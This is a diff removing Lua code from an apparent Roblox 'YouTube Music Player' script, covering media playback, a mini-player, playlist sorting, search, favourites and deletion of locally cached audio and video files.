-				while sound2.TimeLength == 0 and n5 < 5 do
-					n5 += task.wait(0.1)
-				end
-
-				if CurrentRequestId ~= n4 then
-					return
-				end
-				TimerTotal.Text = fn7(sound2.TimeLength)
-			end)
-		end)
-
-		BloquearMidia = false
-	elseif arg == "Local" then
-		fn5(false)
-		local v18 = visible and MiniMusica or Musica
-		v18.Image = "rbxassetid://84131152943912"
-		v18.ImageRectOffset = Vector2.new(0, 0)
-		v18.ImageRectSize = Vector2.new(0, 0)
-		TituloMusica.Text = "<font color=\"rgb(255,255,255)\">" .. arg2 .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.In .. " " .. Traducao.LocalTitle .. "</font>"
-		FotoAutor.Image = "rbxassetid://99316239950686"
-
-		pcall(function()
-			sound2.SoundId = getcustomasset("YouTube Music Player/Local Audios/" .. arg2 .. ".mp3")
-			sound2:Play()
-			Equalizador(true)
-			GiroSpeed = GiroBackup
-
-			task.spawn(function()
-				local n5 = 0
-
-				while sound2.TimeLength == 0 and n5 < 5 do
-					n5 += task.wait(0.1)
-				end
-
-				if CurrentRequestId ~= n4 then
-					return
-				end
-				TimerTotal.Text = fn7(sound2.TimeLength)
-			end)
-		end)
-
-		BloquearMidia = false
-	end
-end
-
-SetMiniPlayer = function(visible)
-	imageButton2.Visible = visible
-
-	local function fn5(arg)
-		if arg then
-			pcall(function()
-				arg:Pause()
-				arg:Stop()
-				arg.Video = nil
-			end)
-		end
-	end
-
-	local function fn6(arg)
-		local v17 = nil
-
-		pcall(function()
-			v17 = getcustomasset(arg)
-		end)
-
-		return v17
-	end
-
-	local function fn7(arg, arg2)
-		if not arg then
-			return
-		end
-
-		if arg2 then
-			arg.ImageRectOffset = Vector2.new(0, 45)
-			arg.ImageRectSize = Vector2.new(480, 270)
-		else
-			arg.ImageRectOffset = Vector2.new(0, 0)
-			arg.ImageRectSize = Vector2.new(0, 0)
-		end
-	end
-
-	local function fn8(arg)
-		if arg == "rbxassetid://108154884074176" then
-			return "loading"
-		end
-
-		if arg == "rbxassetid://110787075859454" then
-			return "empty"
-		end
-
-		if arg == "rbxassetid://84131152943912" then
-			return "special"
-		end
-
-		if arg == "rbxassetid://109021809317392" then
-			return "mini"
-		end
-
-		if arg == "rbxassetid://100415102639682" then
-			return "roblox"
-		end
-		return "default"
-	end
-
-	local function fn9(arg, arg2)
-		if arg2 == "loading" then
-			arg.Image = "rbxassetid://108154884074176"
-			fn7(arg, false)
-		elseif arg2 == "empty" then
-			arg.Image = "rbxassetid://110787075859454"
-			fn7(arg, false)
-		elseif arg2 == "special" then
-			arg.Image = "rbxassetid://84131152943912"
-			fn7(arg, false)
-		elseif arg2 == "mini" then
-			arg.Image = "rbxassetid://109021809317392"
-			fn7(arg, false)
-		elseif arg2 == "roblox" then
-			arg.Image = "rbxassetid://100415102639682"
-			fn7(arg, false)
-		else
-			arg.Image = "rbxassetid://120329190202259"
-			fn7(arg, false)
-		end
-	end
-
-	if visible then
-		if Musica then
-			Musica.Visible = true
-			local v17 = fn8(Musica.Image)
-			fn9(MiniMusica, v17)
-			Musica.Image = "rbxassetid://109021809317392"
-			fn7(Musica, false)
-		end
-
-		if MiniMusica then
-			MiniMusica.Visible = true
-
-			if thumbAtual then
-				MiniMusica.Image = thumbAtual
-				fn7(MiniMusica, true)
-				Musica.Image = "rbxassetid://109021809317392"
-				fn7(Musica, false)
-			end
-		end
-
-		if Video and Video.Visible then
-			local timePosition = Video.TimePosition
-			local v17 = fn6("YouTube Music Player/Videos/" .. CurrentMediaId .. ".webm")
-			fn5(Video)
-
-			if MiniVideo and v17 then
-				fn5(MiniVideo)
-				MiniVideo.Visible = true
-				MiniVideo.Video = v17
-				MiniVideo.TimePosition = timePosition
-				MiniVideo:Play()
-				v12 = MiniVideo
-				Play.Image = "rbxassetid://80704722265943"
-				MiniPlay.Image = "rbxassetid://110232191351528"
-			end
-
-			Video.Visible = false
-		elseif MiniVideo and MiniVideo.Visible then
-			Video.Visible = false
-		end
-	else
-		if MiniVideo and MiniVideo.Visible then
-			local timePosition = MiniVideo.TimePosition
-			local v17 = fn6("YouTube Music Player/Videos/" .. CurrentMediaId .. ".webm")
-			fn5(MiniVideo)
-
-			if Video and v17 then
-				fn5(Video)
-				Video.Visible = true
-				Video.Video = v17
-				Video.TimePosition = timePosition
-				Video:Play()
-				v12 = Video
-				Play.Image = "rbxassetid://80704722265943"
-				MiniPlay.Image = "rbxassetid://110232191351528"
-			end
-		end
-
-		if Musica then
-			Musica.Visible = true
-
-			if MiniMusica then
-				MiniMusica.Visible = true
-			end
-
-			if MiniMusica then
-				local v17 = fn8(MiniMusica.Image)
-				fn9(Musica, v17)
-
-				if thumbAtual then
-					Musica.Image = thumbAtual
-					fn7(Musica, true)
-				end
-			end
-		end
-	end
-end
-
-SortMedia = function(arg, arg2)
-	local attribute = arg:GetAttribute("Build")
-	local attribute2 = arg2:GetAttribute("Build")
-	if attribute and not attribute2 then
-		return true
-	end
-
-	if attribute2 and not attribute then
-		return false
-	end
-	local tag = arg:FindFirstChild("tag")
-	local tag2 = arg2:FindFirstChild("tag")
-
-	if tag then
-		tag = tag.Text:match("^%s*(.-)%s*$"):lower()
-	end
-
-	tag = tag or ""
-
-	if tag2 then
-		tag2 = tag2.Text:match("^%s*(.-)%s*$"):lower()
-	end
-
-	return tag < (tag2 or "")
-end
-
-GetScrollAtual = function()
-	for _, v17 in ipairs(scrolls) do
-		if v17.Visible then
-			return v17
-		end
-	end
-end
-
-GetLista = function(arg)
-	local tbl12 = {}
-
-	for _, child in ipairs(arg:GetChildren()) do
-		if child:IsA("ImageButton") then
-			if not child:GetAttribute("Privado") then
-				local match, v17 = child.Name:match("(.+):(.+)")
-
-				if match and v17 then
-					if not ((v17 == "Video" or v17 == "Roblox") and not flag19) then
-						table.insert(tbl12, child)
-					end
-				end
-			end
-		end
-	end
-
-	table.sort(tbl12, SortMedia)
-	return tbl12
-end
-
-GetSelecionado = function(arg)
-	for _, v17 in ipairs(arg) do
-		if v17.BackgroundColor3 == Color3.fromRGB(139, 0, 0) then
-			return v17
-		end
-	end
-end
-
-PlayBtn = function(arg)
-	local match, v17 = arg.Name:match("(.+):(.+)")
-
-	if match and v17 then
-		fn4(v17, match)
-	end
-end
-
-Pause = function()
-	if not v12 or not flag9 then
-		return
-	end
-
-	if v12:IsA("Sound") then
-		if v12.Playing then
-			v12:Pause()
-			Play.Image = "rbxassetid://110560238983134"
-			MiniPlay.Image = "rbxassetid://119936293795425"
-			SetFreeze(true)
-		else
-			v12:Resume()
-			Play.Image = "rbxassetid://80704722265943"
-			MiniPlay.Image = "rbxassetid://110232191351528"
-			SetFreeze(false)
-		end
-	elseif v12:IsA("VideoFrame") then
-		if v12.Playing then
-			v12:Pause()
-			Play.Image = "rbxassetid://110560238983134"
-			MiniPlay.Image = "rbxassetid://119936293795425"
-			SetFreeze(true)
-		else
-			v12:Play()
-			Play.Image = "rbxassetid://80704722265943"
-			MiniPlay.Image = "rbxassetid://110232191351528"
-			SetFreeze(false)
-		end
-	end
-end
-
-Avancar10s = function()
-	if not v12 or not flag9 then
-		return
-	end
-	local v17 = v12
-	if v17.TimeLength <= 0 then
-		return
-	end
-	local timePosition = v17.TimePosition + 10
-
-	if v17.TimeLength < timePosition then
-		timePosition = v17.TimeLength
-	end
-
-	v17.TimePosition = timePosition
-end
-
-Retroceder10s = function()
-	if not v12 or not flag9 then
-		return
-	end
-	local v17 = v12
-	if v17.TimeLength <= 0 then
-		return
-	end
-	local timePosition = v17.TimePosition - 10
-
-	if timePosition < 0 then
-		timePosition = 0
-	end
-
-	v17.TimePosition = timePosition
-end
-
-Skip = function()
-	local v17 = GetScrollAtual()
-	if not v17 then
-		fn3(Traducao.Erro, Traducao.NenhumaMidia, 5)
-		return
-	end
-	local v18 = GetLista(v17)
-	if #v18 == 0 then
-		fn3(Traducao.Erro, Traducao.NenhumaMidia, 5)
-		return
-	end
-
-	if #v18 == 1 then
-		if v18[1].BackgroundColor3 ~= Color3.fromRGB(139, 0, 0) then
-			PlayBtn(v18[1])
-		end
-
-		return
-	end
-
-	local v19 = GetSelecionado(v18)
-	if not v19 then
-		PlayBtn(v18[1])
-		return
-	end
-	local v20 = nil
-
-	for i, v21 in ipairs(v18) do
-		if v21 == v19 then
-			v20 = i
-			break
-		else
-			v20 = nil
-		end
-	end
-
-	local n4 = v20 + 1
-
-	if n4 > #v18 then
-		n4 = 1
-	end
-
-	PlayBtn(v18[n4])
-end
-
-Back = function()
-	local v17 = GetScrollAtual()
-	if not v17 then
-		fn3(Traducao.Erro, Traducao.NenhumaMidia, 5)
-		return
-	end
-	local v18 = GetLista(v17)
-	if #v18 == 0 then
-		fn3(Traducao.Erro, Traducao.NenhumaMidia, 5)
-		return
-	end
-
-	if #v18 == 1 then
-		if v18[1].BackgroundColor3 ~= Color3.fromRGB(139, 0, 0) then
-			PlayBtn(v18[1])
-		end
-
-		return
-	end
-
-	local v19 = GetSelecionado(v18)
-	if not v19 then
-		PlayBtn(v18[1])
-		return
-	end
-	local v20 = nil
-
-	for i, v21 in ipairs(v18) do
-		if v21 == v19 then
-			v20 = i
-			break
-		else
-			v20 = nil
-		end
-	end
-
-	local n4 = v20 - 1
-
-	if n4 < 1 then
-		n4 = #v18
-	end
-
-	PlayBtn(v18[n4])
-end
-
-EscolherRandom = function(arg)
-	local tbl12 = {}
-	local v17 = GetSelecionado(arg)
-
-	for _, v18 in ipairs(arg) do
-		if v18 ~= v17 and not tbl5[v18] then
-			table.insert(tbl12, v18)
-		end
-	end
-
-	if #tbl12 == 0 then
-		tbl5 = {}
-
-		for _, v18 in ipairs(arg) do
-			if v18 ~= v17 then
-				table.insert(tbl12, v18)
-			end
-		end
-	end
-
-	if #tbl12 == 0 then
-		return v17
-	end
-	local v18 = tbl12[math.random(1, #tbl12)]
-	tbl5[v18] = true
-	return v18
-end
-
-HandleEnded = function(arg)
-	if str4 == "nill" then
-		return
-	end
-	task.wait()
-	arg.Looped = false
-	local v17 = GetScrollAtual()
-
-	if v17 ~= v11 then
-		tbl5 = {}
-		v11 = v17
-	end
-
-	if not v17 then
-		fn3(Traducao.PlayMode, Traducao.PlayModeRepetir, 5)
-		v12.TimePosition = 0
-		v12:Play()
-		return
-	end
-
-	local v18 = GetLista(v17)
-
-	if #v18 == 0 then
-		fn3(Traducao.PlayMode, Traducao.PlayModeRepetir, 5)
-		v12.TimePosition = 0
-		v12:Play()
-		return
-	end
-
-	local v19 = GetSelecionado(v18)
-
-	if v19 then
-		tbl5[v19] = true
-	end
-
-	if #v18 == 1 then
-		if not v19 then
-			PlayBtn(v18[1])
-		else
-			fn3(Traducao.PlayMode, Traducao.PlayModeRepetir, 5)
-			v12.TimePosition = 0
-			v12:Play()
-		end
-
-		return
-	end
-
-	if str4 == "Random" then
-		local v20 = EscolherRandom(v18)
-
-		if v20 then
-			PlayBtn(v20)
-		end
-
-		return
-	end
-
-	Skip()
-end
-
-sound2.Ended:Connect(function()
-	HandleEnded(sound2)
-end)
-
-Video.Ended:Connect(function()
-	if Video and Video.Visible then
-		HandleEnded(Video)
-	end
-end)
-
-MiniVideo.Ended:Connect(function()
-	if MiniVideo and MiniVideo.Visible then
-		HandleEnded(MiniVideo)
-	end
-end)
-
-Deletar = function(arg, arg2)
-	if BloquearMidia then
-		fn3(Traducao.Aguarde, Traducao.DownloadFazendo, 5)
-		return
-	end
-
-	if _G.CurrentPlaying then
-		local match, v17 = _G.CurrentPlaying:match("^(.-)%:(.+)$")
-
-		if v17 == arg then
-			fn4(match, v17)
-		end
-	end
-
-	local tbl12 = {
-		"YouTube Music Player/Internal/Cache/author_" .. arg .. ".png",
-		"YouTube Music Player/Internal/Cache/thumb_" .. arg .. ".png",
-	}
-
-	for _, v17 in ipairs({
-		"YouTube Music Player/Musics/" .. arg .. ".mp3",
-		"YouTube Music Player/Videos/" .. arg .. ".webm",
-		"YouTube Music Player/Roblox IDS/" .. arg .. ".rbx",
-		"YouTube Music Player/Local Audios/" .. arg .. ".mp3",
-	}) do
-		if isfile(v17) then
-			delfile(v17)
-		end
-	end
-
-	for _, v17 in ipairs(tbl12) do
-		if isfile(v17) then
-			delfile(v17)
-		end
-	end
-
-	for i = #BibliotecaMusicas, 1, -1 do
-		if BibliotecaMusicas[i].id == arg then
-			table.remove(BibliotecaMusicas, i)
-		end
-	end
-
-	for i = #BilbliotecaVideos, 1, -1 do
-		if BilbliotecaVideos[i].id == arg then
-			table.remove(BilbliotecaVideos, i)
-		end
-	end
-
-	for i = #BibliotecaRoblox, 1, -1 do
-		if BibliotecaRoblox[i].id == arg then
-			table.remove(BibliotecaRoblox, i)
-		end
-	end
-
-	for i = #BibliotecaLocal, 1, -1 do
-		if BibliotecaLocal[i].name == arg then
-			table.remove(BibliotecaLocal, i)
-		end
-	end
-
-	DesfavoritarFile(arg)
-	fn3(Traducao.Excluido, arg2, 8)
-
-	local function fn5(arg3)
-		for _, child in ipairs(arg3:GetChildren()) do
-			local name = child:IsA("ImageButton") and child.Name and arg
-
-			if name then
-				local str6 = arg .. ":"
-				name = child.Name:sub(1, #arg + 1) == str6
-			end
-
-			if name then
-				child:Destroy()
-			end
-		end
-	end
-
-	task.wait(0.1)
-	fn5(ScrollTodos)
-	fn5(ScrollMusicas)
-	fn5(ScrollVideos)
-	fn5(ScrollRoblox)
-	fn5(ScrollLocal)
-	fn5(ScrollFav)
-	fn5(ScrollPesquisa)
-end
-
--- https://discord.gg/AwGHNh7Z7T
-local function fn5(text2, arg, arg2, arg3)
-	local tbl12 = {}
-	local imageButton3 = Instance.new("ImageButton")
-	imageButton3.Name = arg2 .. ":" .. arg
-	imageButton3.Size = UDim2.new(0, 148, 0, 35)
-	imageButton3.Position = UDim2.new(0, 5, 0, 5)
-	imageButton3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	imageButton3.BackgroundTransparency = 0
-	imageButton3.AutoButtonColor = false
-	local imageLabel = Instance.new("ImageLabel")
-	imageLabel.Size = UDim2.new(0, 35, 0, 35)
-	imageLabel.Position = UDim2.new(0, 0, 0, 0)
-	imageLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	imageLabel.BackgroundTransparency = 0
-	local v17 = ScrollTodos
-	local v18
-
-	if arg == "Musica" then
-		imageLabel.Image = "rbxassetid://136933987460149"
-
-		if str2 == "Musicas" then
-			v18 = ScrollMusicas
-		else
-			v18 = v17
-		end
-	elseif arg == "Video" then
-		imageLabel.Image = "rbxassetid://105308603886068"
-
-		if str2 == "Videos" then
-			v18 = ScrollVideos
-		else
-			v18 = v17
-		end
-	elseif arg == "Roblox" then
-		imageLabel.Image = "rbxassetid://118724747640040"
-
-		if str2 ~= "Roblox" then
-			v18 = v17
-		else
-			v18 = ScrollRoblox
-		end
-	elseif arg == "Local" then
-		imageLabel.Image = "rbxassetid://93635917640466"
-
-		if str2 ~= "Local" then
-			v18 = v17
-		else
-			v18 = ScrollLocal
-		end
-	else
-		v18 = v17
-	end
-
-	imageButton3.Parent = v18
-	imageLabel.Parent = imageButton3
-	imageLabel.ImageTransparency = 0
-	local textLabel = Instance.new("TextLabel")
-	textLabel.Size = UDim2.new(0, 107, 1, 0)
-	textLabel.Position = UDim2.new(0, 38, 0, 0)
-	textLabel.BackgroundTransparency = 1
-	textLabel.TextScaled = true
-	textLabel.TextWrapped = true
-	textLabel.Name = "tag"
-	textLabel.Text = text2
-	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-	textLabel.Font = Enum.Font.SourceSansBold
-	textLabel.Parent = imageButton3
-	local imageButton4 = Instance.new("ImageButton")
-	imageButton4.Size = UDim2.new(0, 35, 0, 35)
-	imageButton4.Position = UDim2.new(1, 8, 0, 0)
-	imageButton4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	imageButton4.Parent = imageButton3
-	local v19 = ipairs
-	local v20 = tbl6
-	local tbl13
-
-	if tbl6 then
-		tbl13 = v20
-	else
-		tbl13 = {}
-	end
-
-	local flag21 = false
-
-	for _, v21 in v19(tbl13) do
-		if v21 == arg2 then
-			flag21 = true
-			break
-		end
-	end
-
-	if flag21 then
-		imageButton4.Image = "rbxassetid://122765197997575"
-	else
-		imageButton4.Image = "rbxassetid://102097543764342"
-	end
-
-	local imageButton5 = Instance.new("ImageButton")
-	imageButton5.Size = UDim2.new(0, 35, 0, 35)
-	imageButton5.Position = UDim2.new(1, 51, 0, 0)
-	imageButton5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	imageButton5.BackgroundTransparency = 0
-	imageButton5.Image = "rbxassetid://125370105968945"
-	imageButton5.Parent = imageButton3
-
-	if arg2 == "LvvrO6JifEA" then
-		imageButton5.ImageTransparency = 0.8
-		imageButton5.Active = false
-		imageButton3:SetAttribute("Build", true)
-	end
-
-	Corner(imageButton3, 5)
-	Corner(imageLabel, 5)
-	Corner(imageButton4, 5)
-	Corner(imageButton5, 5)
-	Stroke(imageButton3, 50, 50, 50, 2)
-	Stroke(imageLabel, 50, 50, 50, 2)
-	Stroke(imageButton4, 50, 50, 50, 2)
-	Stroke(imageButton5, 50, 50, 50, 2)
-
-	if arg == "Roblox" and arg3 == false then
-		imageButton3:SetAttribute("Privado", true)
-		imageButton3.BackgroundTransparency = 0.9
-		imageLabel.BackgroundTransparency = 0.9
-		imageLabel.ImageTransparency = 0.9
-		textLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
-	end
-
-	if (arg == "Video" or arg == "Roblox") and not flag19 then
-		imageButton3.BackgroundTransparency = 0.9
-		imageLabel.BackgroundTransparency = 0.9
-		imageLabel.ImageTransparency = 0.9
-		textLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
-	end
-
-	tbl12[#tbl12 + 1] = imageButton3.MouseButton1Click:Connect(function()
-		if arg == "Roblox" and arg3 == false then
-			fn3(Traducao.Erro, Traducao.Privado, 10)
-			return
-		end
-
-		if (arg == "Video" or arg == "Roblox") and not flag19 then
-			fn3(Traducao.OpcaoBloqueadaTitle, Traducao.OpcaoBloqueadaText, 10)
-		else
-			fn4(arg, arg2)
-		end
-	end)
-
-	tbl12[#tbl12 + 1] = imageButton4.MouseButton1Click:Connect(function()
-		if imageButton4.Image == "rbxassetid://122765197997575" then
-			imageButton4.Image = "rbxassetid://102097543764342"
-			fn3(Traducao.Desfavoritado, text2, 8)
-			DesfavoritarFile(arg2)
-
-			if str2 == "Favoritos" then
-				local v21 = ScrollTodos
-
-				if arg == "Musica" then
-					v21 = ScrollMusicas
-				elseif arg == "Video" then
-					v21 = ScrollVideos
-				elseif arg == "Roblox" then
-					v21 = ScrollRoblox
-				end
-
-				if imageButton3.Parent ~= v21 then
-					imageButton3.Parent = v21
-				end
-			end
-		else
-			imageButton4.Image = "rbxassetid://122765197997575"
-			fn3(Traducao.Favoritado, text2, 8)
-			FavoritarFile(arg2)
-		end
-	end)
-
-	tbl12[#tbl12 + 1] = imageButton5.MouseButton1Click:Connect(function()
-		if not imageButton5.Active then
-			return
-		end
-		Deletar(arg2, textLabel.Text)
-	end)
-
-	imageButton3.Destroying:Connect(function()
-		for _, v21 in ipairs(tbl12) do
-			pcall(function()
-				v21:Disconnect()
-			end)
-		end
-
-		tbl12 = {}
-	end)
-end
-
-Parent = function(arg)
-	local tbl12 = {}
-
-	local v17 = ({
-		Musica = ScrollMusicas,
-		Video = ScrollVideos,
-		Roblox = ScrollRoblox,
-		Local = ScrollLocal,
-		Todos = ScrollTodos,
-		Favoritos = ScrollFav,
-	})[arg]
-
-	if not v17 then
-		return
-	end
-
-	for i = 1, #scrolls do
-		local children = scrolls[i]:GetChildren()
-
-		for i2 = 1, #children do
-			local v18 = children[i2]
-
-			if v18:IsA("GuiObject") then
-				tbl12[#tbl12 + 1] = v18
-			end
-		end
-	end
-
-	if arg == "Todos" then
-		for i = 1, #tbl12 do
-			tbl12[i].Parent = v17
-		end
-	elseif arg == "Favoritos" then
-		local v18 = tbl6
-
-		for i = 1, #tbl12 do
-			local v19 = tbl12[i]
-			local match = v19.Name:match("^(.-):")
-
-			if table.find(v18, match) then
-				v19.Parent = v17
-			end
-		end
-	else
-		for i = 1, #tbl12 do
-			local v18 = tbl12[i]
-			local match, v19 = v18.Name:match("^(.-):(.+)$")
-
-			if v19 == arg then
-				v18.Parent = v17
-			end
-		end
-	end
-
-	v17.CanvasPosition = Vector2.zero
-end
-
-AtualizarScroll = function(arg)
-	if arg == ScrollLocal and #arg:GetChildren() == 0 then
-		arg.Visible = false
-		VazioLocal.Visible = true
-		ErroPL.Visible = true
-		ErroPL.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.LocalTitle .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.LocalText .. "</font>"
-		SemResultadoPL.Visible = false
-		AguardandoPL.Visible = false
-		Vazio.Visible = false
-		return
-	end
-
-	if #arg:GetChildren() > 0 then
-		arg.Visible = true
-		Vazio.Visible = false
-		VazioLocal.Visible = false
-		ErroPL.Visible = false
-		SemResultadoPL.Visible = false
-		AguardandoPL.Visible = false
-	else
-		arg.Visible = false
-		Vazio.Visible = true
-		ErroPL.Visible = true
-		ErroPL.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.Vazio .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.VazioTexto .. "</font>"
-		SemResultadoPL.Visible = false
-		AguardandoPL.Visible = false
-		VazioLocal.Visible = false
-	end
-end
-
-Abas = {
-	Todos = {
-		parent = "Todos",
-		text = function()
-			return Traducao.Todos
-		end,
-		scroll = ScrollTodos,
-	},
-	Musicas = {
-		parent = "Musica",
-		text = function()
-			return Traducao.Musicas
-		end,
-		scroll = ScrollMusicas,
-	},
-	Videos = {
-		parent = "Video",
-		text = function()
-			return "Videos"
-		end,
-		scroll = ScrollVideos,
-	},
-	Roblox = {
-		parent = "Roblox",
-		text = function()
-			return "Roblox IDS"
-		end,
-		scroll = ScrollRoblox,
-	},
-	Favoritos = {
-		parent = "Favoritos",
-		text = function()
-			return Traducao.Favoritos
-		end,
-		scroll = ScrollFav,
-	},
-	Local = {
-		parent = "Local",
-		text = function()
-			return Traducao.LocalTitle
-		end,
-		scroll = ScrollLocal,
-	},
-}
-
-Ordem = { "Todos", "Musicas", "Videos", "Roblox", "Favoritos", "Local", "Pesquisar" }
-
-OcultarScrolls = function()
-	ScrollTodos.Visible = false
-	ScrollMusicas.Visible = false
-	ScrollVideos.Visible = false
-	ScrollRoblox.Visible = false
-	ScrollFav.Visible = false
-	ScrollLocal.Visible = false
-	ScrollPesquisa.Visible = false
-end
-
-ToTab = function(arg)
-	str2 = arg
-	OcultarScrolls()
-
-	if arg == "Pesquisar" then
-		AbaPL.Visible = false
-		PesquisaPL.Visible = true
-		AguardandoPL.Visible = true
-		Vazio.Visible = false
-		ErroPL.Visible = true
-		PesquisaPL.Text = ""
-		VazioLocal.Visible = false
-		ErroPL.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.PesquiseTitle .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.PesquiseTextPL .. "</font>"
-		return
-	end
-
-	local v17 = Abas[arg]
-	if not v17 then
-		return
-	end
-	Parent(v17.parent)
-	AbaPL.Text = v17.text()
-	AbaPL.Visible = true
-	PesquisaPL.Visible = false
-	AtualizarScroll(v17.scroll)
-end
-
-ProximaAba = function(arg)
-	local v17 = nil
-
-	for i, v18 in ipairs(Ordem) do
-		if v18 == str2 then
-			v17 = i
-			break
-		else
-			v17 = nil
-		end
-	end
-
-	if not v17 then
-		return
-	end
-	local n4 = v17 + arg
-
-	if #Ordem < n4 then
-		n4 = 1
-	end
-
-	if n4 < 1 then
-		n4 = #Ordem
-	end
-
-	return Ordem[n4]
-end
-
-DireitaPL.MouseButton1Click:Connect(function()
-	fn2("88442833509532")
-	ToTab(ProximaAba(1))
-end)
-
-EsquerdaPL.MouseButton1Click:Connect(function()
-	fn2("88442833509532")
-	ToTab(ProximaAba(-1))
-end)
-
-OrganizarSF = function(arg)
-	task.wait()
-	local tbl12 = {}
-
-	for _, child in ipairs(arg:GetChildren()) do
-		if child:IsA("GuiObject") then
-			table.insert(tbl12, child)
-		end
-	end
-
-	table.sort(tbl12, SortMedia)
-	local n4 = 5
-
-	for _, v17 in ipairs(tbl12) do
-		v17.Position = UDim2.new(0, 5, 0, n4)
-		n4 = n4 + v17.Size.Y.Offset + 10
-	end
-
-	arg.CanvasSize = UDim2.new(0, 243, 0, math.max(n4 - 6, 0))
-end
-
-Pesquisando = false
-
-PesquisarPL = function(arg)
-	local tbl12 = { ScrollTodos, ScrollMusicas, ScrollVideos, ScrollRoblox, ScrollFav, ScrollLocal }
-	ScrollPesquisa.CanvasPosition = Vector2.new(0, 0)
-	Pesquisando = true
-
-	for _, child in ipairs(ScrollPesquisa:GetChildren()) do
-		if child:IsA("ImageButton") then
-			child.Parent = ScrollTodos
-		end
-	end
-
-	Pesquisando = false
-
-	if not arg or arg:match("^%s*$") then
-		ScrollPesquisa.Visible = false
-		SemResultadoPL.Visible = false
-		AguardandoPL.Visible = true
-		ErroPL.Visible = true
-		ErroPL.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.PesquiseTitle .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.PesquiseTextPL .. "</font>"
-		return
-	end
-
-	local str6 = arg:lower()
-	local visible = false
-
-	for _, v17 in ipairs(tbl12) do
-		for _, child in ipairs(v17:GetChildren()) do
-			if child:IsA("GuiObject") then
-				local tag = child:FindFirstChild("tag")
-
-				if tag and tag.Text then
-					if string.find(tag.Text:lower(), str6, 1, true) then
-						child.Parent = ScrollPesquisa
-						visible = true
-					end
-				end
-			end
-		end
-	end
-
-	ScrollPesquisa.Visible = visible
-	AguardandoPL.Visible = false
-	local visible2 = not visible
-	SemResultadoPL.Visible = visible2
-	ErroPL.Visible = visible2
-
-	if visible2 then
-		ErroPL.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.SemResutadoTitle .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.SemResutadoTextPL .. "</font>"
-	end
-end
-
-Scrolls = {
-	Todos = ScrollTodos,
-	Musicas = ScrollMusicas,
-	Videos = ScrollVideos,
-	Roblox = ScrollRoblox,
-	Favoritos = ScrollFav,
-	Local = ScrollLocal,
-}
-
-ConectarScroll = function(arg, arg2)
-	arg2.ChildAdded:Connect(function()
-		OrganizarSF(arg2)
-
-		if str2 == arg then
-			AtualizarScroll(arg2)
-		end
-	end)
-
-	arg2.ChildRemoved:Connect(function()
-		OrganizarSF(arg2)
-
-		if str2 == arg then
-			AtualizarScroll(arg2)
-		end
-	end)
-end
-
-for k, v17 in pairs(Scrolls) do
-	ConectarScroll(k, v17)
-end
-
-ScrollPesquisa.ChildAdded:Connect(function()
-	OrganizarSF(ScrollPesquisa)
-end)
-
-ScrollPesquisa.ChildRemoved:Connect(function()
-	if ScrollPesquisa.Visible and not Pesquisando then
-		PesquisarPL(PesquisaPL.Text)
-	end
-end)
-
-PesquisaPL.Focused:Connect(function()
-	PesquisarPL()
-end)
-
-PesquisaPL.FocusLost:Connect(function()
-	local match = PesquisaPL.Text:match("^%s*(.-)%s*$")
-	PesquisaPL.Text = match
-
-	if match ~= "" then
-		PesquisarPL(match)
-	end
-end)
-
-FixNome = function()
-	local str6 = "YouTube Music Player/Local Audios"
-
-	for _, v17 in ipairs(listfiles("YouTube Music Player/Local Audios")) do
-		pcall(function()
-			local match = v17:match("[^/\\]+$")
-
-			if match and match:sub(-4) == ".mp3" then
-				local str7 = match:sub(1, -5)
-
-				if #str7 > 90 then
-					local str8 = str6 .. "/" .. str7:sub(1, 80) .. "_" .. tostring(math.random(10000, 99999)) .. ".mp3"
-
-					if not isfile(str8) then
-						local v18 = readfile(v17)
-						writefile(str8, v18)
-						delfile(v17)
-						local n4 = 0
-
-						while isfile(v17) and n4 < 50 do
-							task.wait()
-							n4 += 1
-						end
-					end
-				end
-			end
-		end)
-	end
-end
-
-UpdatePlaylist = function()
-	task.spawn(function()
-		local tbl12 = {
-			Musics = "YouTube Music Player/Musics",
-			Videos = "YouTube Music Player/Videos",
-			Roblox = "YouTube Music Player/Roblox IDS",
-			Local = "YouTube Music Player/Local Audios",
-		}
-
-		FixNome()
-
-		for _, v17 in pairs(tbl12) do
-			if not isfolder(v17) then
-				makefolder(v17)
-			end
-		end
-
-		local function fn6(arg)
-			local ok3, result3 = pcall(listfiles, arg)
-			return ok3 and result3 or {}
-		end
-
-		local function fn7(arg)
-			return arg:match("[^/\\]+$")
-		end
-
-		local function fn8(arg, arg2)
-			return arg:gsub(arg2:gsub("%.", "%%."), "")
-		end
-
-		local tbl13 = { Musics = {}, Videos = {}, Roblox = {}, Local = {} }
-
-		for _, v17 in pairs(BibliotecaMusicas) do
-			tbl13.Musics[v17.id] = true
-		end
-
-		for _, v17 in pairs(BilbliotecaVideos) do
-			tbl13.Videos[v17.id] = true
-		end
-
-		for _, v17 in pairs(BibliotecaRoblox) do
-			tbl13.Roblox[v17.id] = true
-		end
-
-		for _, v17 in pairs(BibliotecaLocal) do
-			tbl13.Local[v17.name] = true
-		end
-
-		local tbl14 = { Musics = {}, Videos = {}, Roblox = {}, Local = {} }
-		local v17 = ipairs
-		local v18 = fn6(tbl12.Musics)
-
-		for _, v19 in v17(v18) do
-			local v20 = fn8(fn7(v19), ".mp3")
-			tbl14.Musics[v20] = true
-
-			if not tbl13.Musics[v20] then
-				task.spawn(function()
-					local v21, v22, v23, v24 = ApiInfo(v20)
-					if not (v21 and v22 and v23) then
-						return
-					end
-					table.insert(BibliotecaMusicas, { id = v20, name = v21, author = v22, thumb = v23, authorUrl = v24 })
-					fn5(v21, "Musica", v20)
